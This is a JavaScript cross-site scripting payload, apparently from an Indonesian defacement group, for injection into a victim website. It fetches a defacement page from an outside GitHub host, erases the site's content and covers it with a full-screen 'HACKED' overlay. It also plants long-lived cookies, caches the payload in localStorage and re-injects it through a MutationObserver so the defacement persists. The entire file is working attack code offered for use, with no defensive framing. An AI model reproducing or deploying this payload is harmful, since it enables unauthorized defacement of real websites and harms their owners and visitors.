// ============================================
// XSS PAYLOAD – ILHAMN4XSEC
// Menggunakan deface dari:
// https://github.com/mashamxploit/Hacked-By-Ilhamxsec
// Versi: 2.0 – Full Integration
// ============================================

(function() {
    var DEFACE_URL = 'https://raw.githubusercontent.com/mashamxploit/Hacked-By-Ilhamxsec/main/index.html';
    var COOKIE_NAME = 'deface_ilham';
    var STORAGE_KEY = 'deface_payload_ilham';
    
    document.cookie = COOKIE_NAME + '=active; path=/; max-age=31536000';
    document.cookie = 'xss_ilham=injected; path=/; max-age=31536000';
    
    function injectDeface(html) {
        document.body.innerHTML = '';
        document.head.innerHTML = '';
        
        var iframe = document.createElement('iframe');
        iframe.srcdoc = html;
        iframe.style.position = 'fixed';
        iframe.style.top = '0';
        iframe.style.left = '0';
        iframe.style.width = '100vw';
        iframe.style.height = '100vh';
        iframe.style.border = 'none';
        iframe.style.zIndex = '999999999';
        iframe.style.background = '#000';
        document.body.appendChild(iframe);
        
        document.documentElement.style.overflow = 'hidden';
        document.body.style.overflow = 'hidden';
        
        var watermark = document.createElement('div');
        watermark.style.position = 'fixed';
        watermark.style.bottom = '10px';
        watermark.style.right = '10px';
        watermark.style.color = 'rgba(255,0,0,0.2)';
        watermark.style.fontFamily = 'monospace';
        watermark.style.fontSize = '10px';
        watermark.style.zIndex = '999999999';
        watermark.style.textShadow = '0 0 5px #000';
        watermark.textContent = 'ILHAMN4XSEC // GARUDA';
        document.body.appendChild(watermark);
    }
    
    fetch(DEFACE_URL)
        .then(function(response) {
            if (!response.ok) throw new Error('Gagal mengambil payload');
            return response.text();
        })
        .then(function(html) {
            localStorage.setItem(STORAGE_KEY, html);
            localStorage.setItem('deface_timestamp', Date.now());
            localStorage.setItem('deface_owner', 'ILHAMN4XSEC');
            injectDeface(html);
        })
        .catch(function() {
            var cached = localStorage.getItem(STORAGE_KEY);
            if (cached) {
                injectDeface(cached);
            } else {
                var emergency = '<!DOCTYPE html><html><head><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:monospace}.container{text-align:center;color:#ff0000}h1{font-size:5rem;text-shadow:0 0 20px #ff0000;letter-spacing:10px}.sub{color:#ff4444;font-size:1.5rem;margin-top:20px}.owner{color:#666;margin-top:50px;letter-spacing:5px}</style></head><body><div class="container"><h1>HACKED</h1><div class="sub">SYSTEM COMPROMISED</div><div class="owner">ILHAMN4XSEC</div></div></body></html>';
                injectDeface(emergency);
            }
        });
    
    window.onload = function() {
        var payload = localStorage.getItem(STORAGE_KEY);
        if (payload && !document.querySelector('iframe[srcdoc]')) {
            injectDeface(payload);
        }
    };
    
    var observer = new MutationObserver(function() {
        if (!document.querySelector('iframe[srcdoc]')) {
            var backup = localStorage.getItem(STORAGE_KEY);
            if (backup) {
                injectDeface(backup);
            }
        }
    });
    observer.observe(document.body, { childList: true, subtree: true });
    
    console.log('[ILHAMN4XSEC] XSS Payload Aktif');
    console.log('[+] Target:', window.location.href);
    console.log('[+] Status: SISTEM DIREBUT');
    console.log('[+] Deface dari:', DEFACE_URL);
})();